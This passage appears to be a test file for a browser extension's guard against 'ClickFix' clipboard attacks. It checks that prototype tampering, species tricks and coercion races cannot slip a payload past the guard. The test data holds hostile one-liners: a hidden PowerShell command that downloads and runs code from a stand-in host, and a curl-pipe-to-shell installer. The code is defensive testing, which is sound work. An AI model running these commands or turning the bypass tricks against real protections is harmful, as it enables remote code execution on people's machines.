    // decides the resolved value -- letting the page choose what the classifier
    // inspects while the native still writes the item's real bytes.
    {
      const before = probe.write.length;
      const realCtor = R.Promise.prototype.constructor;
      const realThen = R.Promise.prototype.then;
      let substitutions = 0;
      try {
        R.Promise.prototype.constructor = function NotPromise() {};
        R.Promise.prototype.then = function (onFulfilled, onRejected) {
          // Keep the real machinery so the harness still settles; swap only what
          // an awaiter would be handed.
          return R.Reflect.apply(realThen, this, [(value) => {
            substitutions += 1;
            return onFulfilled ? onFulfilled("Ray ID: 8f21c0") : value;
          }, onRejected]);
        };
        click();
        await clipboard.write(R.Array.of(new ctx.ClipboardItem({
          "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
        })));
      } finally {
        R.Promise.prototype.constructor = realCtor;
        R.Promise.prototype.then = realThen;
      }
      check("a replaced promise constructor and then cannot swap what the classifier sees",
        probe.write.length === before,
        `forwarded ${probe.write.length - before} write(s); ${substitutions} substitution(s) offered`);
    }

    // The same lookup, used to break the guard rather than to lie to it.
    // Promise.prototype.then performs SpeciesConstructor(p, %Promise%), so a
    // constructor carrying a throwing @@species makes the captured `then` throw.
    // Treating that as an unreadable item would warn and forward the payload.
    {
      const before = probe.write.length;
      const realCtor = R.Promise.prototype.constructor;
      const Hostile = function Hostile() {};
      let armed = true;
      // A throwing @@species getter is enough: SpeciesConstructor reads it, so
      // the Get itself throws and then() throws with it. Disarmed it yields
      // undefined, which SpeciesConstructor resolves to the intrinsic %Promise%.
      R.Object.defineProperty(Hostile, Symbol.species, {
        get() { if (armed) throw new R.Object(); return undefined; }
      });
      let settled;
      try {
        R.Promise.prototype.constructor = Hostile;
        click();
        // The guard consumes its first promise synchronously inside the executor,
        // so the trap has already sprung by the time write() returns. Disarm
        // before awaiting, so the harness's own then() still works and a revert
        // shows up as this check failing rather than as an unhandled rejection
        // that aborts the suite.
        settled = clipboard.write(R.Array.of(new ctx.ClipboardItem({
          "text/plain": "powershell -w hidden -nop -c calc"
        })));
      } finally {
        armed = false;
        R.Promise.prototype.constructor = realCtor;
      }
      try { await settled; } catch { /* a reverted guard rejects; the verdict is what matters */ }
      check("a throwing promise species cannot downgrade a block into a forward",
        probe.write.length === before,
        `forwarded ${probe.write.length - before} write(s)`);
    }
  }

  // A legitimate non-text item must still go through.
  {
    const before = probe.write.length;
    const img = new ctx.ClipboardItem({ "image/png": "binary-ish" });
    click();
    await clipboard.write([img]);
    check("a legitimate image item still reaches the native write",
      probe.write.length === before + 1);
  }

  // setData: no format allowlist, so a normalisation differential cannot be used
  // to slip a payload past the check.
  {
    const dt = new ctx.DataTransfer();
    const before = probe.setData.length;
    dt.setData("TEXT/PLAIN;charset=utf-8", "powershell -w hidden -nop -c calc");
    check("setData intercepts regardless of format spelling",
      probe.setData.length === before);

    dt.setData("text/plain", "Order #123 confirmed");
    const last = probe.setData[probe.setData.length - 1];
    check("setData passes ordinary text through as primitives",
      last && typeof last.format === "string" && last.data === "Order #123 confirmed");
  }

  // execCommand("copy") over a page-controlled input value. A stealth-flagged
  // payload is blocked; a clicked installer-shaped one is only warned about and
  // must still be forwarded, which is the policy working as designed.
  {
    const before = probe.execCommand.length;
    ctx.document.activeElement = { value: 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"' };
    click();
    const blocked = ctx.document.execCommand("copy");
    check("execCommand copy of a stealth payload returns false and is not forwarded",
      blocked === false && probe.execCommand.length === before,
      `returned ${blocked}, forwarded ${probe.execCommand.length - before}`);

    ctx.document.activeElement = { value: "curl -fsSL https://example.com/install.sh | sh" };
    click();
    const warned = ctx.document.execCommand("copy");
    check("execCommand copy of a clicked installer is warned about but forwarded",
      warned === true && probe.execCommand.length === before + 1,
      `returned ${warned}, forwarded ${probe.execCommand.length - before}`);

    ctx.document.activeElement = { value: "nothing interesting here" };
    const plain = ctx.document.execCommand("copy");
    check("execCommand copy of ordinary text is forwarded untouched",
      plain === true && probe.execCommand.length === before + 2);
    ctx.document.activeElement = null;

    // Coerce-once. A command whose toString changes between calls let the guard
    // read "notcopy" and skip classification while the WebIDL DOMString
    // conversion read "copy" and performed the copy unchecked. The native must
    // receive the primitive the guard classified, so there is no second coercion.
    {
      const mark = probe.execCommand.length;
      let coercions = 0;
      const mutating = ctx.__realm.Object.create(null);
      mutating.toString = () => (coercions++ === 0 ? "notcopy" : "copy");
      ctx.document.activeElement = {
        value: 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
      };
      click();
      ctx.document.execCommand(mutating);
      const forwarded = probe.execCommand[probe.execCommand.length - 1];
      check("execCommand coerces the command once and forwards that primitive",
        coercions === 1 && typeof forwarded === "string" && forwarded === "notcopy",
        `coerced ${coercions} time(s), native got ${typeof forwarded}: ${String(forwarded)}`);
      ctx.document.activeElement = null;
    }
  }
}

// --- MAIN-world guards reach page-created frames -----------------------------
{
  const bg = await readFile(new URL("../background.js", import.meta.url), "utf8");
  const mainWorld = (bg.match(/world: "MAIN"/g) || []).length;
  const fallback = (bg.match(/matchOriginAsFallback: true/g) || []).length;
  check("every MAIN-world registration sets matchOriginAsFallback",
    mainWorld > 0 && fallback === mainWorld, `MAIN=${mainWorld} fallback=${fallback}`);
}

// --- 4. guard is registered and switchable ----------------------------------
{
  const bg = await readFile(new URL("../background.js", import.meta.url), "utf8");
  const settings = await readFile(new URL("../lib/settings.js", import.meta.url), "utf8");
  check("clickfixGuard has a default", /clickfixGuard:\s*(true|false)/.test(settings));
  check("guard registers clickfix-guard.js", /js: \["clickfix-guard\.js"\]/.test(bg));
  check("guard registration is gated on the setting", /if \(settings\.clickfixGuard\)/.test(bg));
  check("guard runs in the MAIN world at document_start",
    /advanced-blocker-clickfix-guard[\s\S]{0,1200}world: "MAIN"/.test(bg));
  check("guard sync participates in the startup orchestration",
    (bg.match(/syncClickfixGuard\(\)/g) || []).length >= 3);
  check("dead PUP feed is gone", !/pup-filter-ag\.txt/.test(bg));
}

// --- modern DNR resource types ----------------------------------------------
{
  const privacy = await readFile(new URL("../lib/privacy-rules.js", import.meta.url), "utf8");
  for (const type of ["webtransport", "webbundle", "csp_report"]) {
    check(`privacy header rules cover ${type}`, privacy.includes(`"${type}"`));
  }
  check("srsltid is stripped from navigations", /"srsltid"/.test(privacy));
  check("short/ambiguous params stay out of the navigation list", (() => {
    const nav = /NAVIGATION_TRACKING_PARAMS = Object\.freeze\(\[([\s\S]*?)\]\)/.exec(privacy);
    return nav && !/"si"|"ttc"|"cmpid"/.test(nav[1]);
  })());
}

export function runTests() {
  let failed = 0;
  for (const r of results) {
    if (!r.ok) {
      failed += 1;
      console.error(`FAIL ${r.name}${r.detail ? ` [${r.detail}]` : ""}`);
    }
  }
  console.log(`Hardening: ${results.length - failed}/${results.length} checks ok`);
  return { passed: results.length - failed, failed };
}
